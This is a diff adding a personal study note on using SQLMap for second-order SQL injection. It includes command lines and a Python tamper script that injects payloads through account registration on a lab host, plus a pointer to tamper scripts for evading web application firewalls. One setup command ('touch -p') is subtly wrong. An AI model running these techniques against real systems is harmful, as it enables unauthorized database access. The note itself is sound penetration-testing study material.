@@ -1,0 +1,66 @@
+:PROPERTIES:
+:ID:       ef03bc97-55a3-44e6-b24a-523630f0090d
+:END:
+#+TITLE: SQLMap
+#+CREATED: [2023-07-12 Wed 22:05]
+#+LAST_MODIFIED: [2023-07-12 Wed 22:15]
+* SQLMap
+
+Sqlmap is an advanced tool for finding and exploiting [[id:81d62666-4ce8-4244-b498-739a680f9673][SQL Injection]].
+
+** Second Order Injection
+For very simple use cases you might not need a tamper script
+
+#+begin_src shell
+sqlmap -r request.raw -p parameter --second-url url2
+#+end_src
+there is also another option for sending another request if needed
+#+begin_src shell
+sqlmap -r request.raw -p parameter --second-req request2.raw
+#+end_src
+
+If more is needed to be done then you need to create a tamper script.
+create a dir for the tamper name it like second for example
+#+begin_src shell
+mkdir second
+touch -p second/__init__.py
+#+end_src
+then write the tamper script.[fn:1]
+#+BEGIN_SRC python :session one :results output replace
+#!/usr/bin/env python
+
+import re
+import requests
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def login_account(payload):
+    proxies = {'http':'http://127.0.0.1:8080'}
+    cookies = {"PHPSESSID": "6laafab1f6om5rqjsbvhmq9mf2"}
+
+    params = {"username":"asdasdasd", "email":payload, "password":"11111111"}
+    url = "http://10.10.10.10/create.php"
+    pr = requests.post(url, data=params, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)
+
+    url = "http://10.10.10.10/exit.php"
+    pr = requests.get(url, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)
+
+def tamper(payload, **kwargs):
+    headers = kwargs.get("headers", {})
+    login_account(payload)
+    return payload
+#+END_SRC
+By using tampers you should be able to set sqlmap up for most tasks. They are executed before starting injection to try and it must always return a payload.[fn:1]
+
+** Bypassing WAF
+Checkout the different tamper scripts that can modify the requests.
+#+begin_src shell
+sqlmap --list-tampers
+#+end_src
+
+* Footnotes
+
+[fn:1] https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap
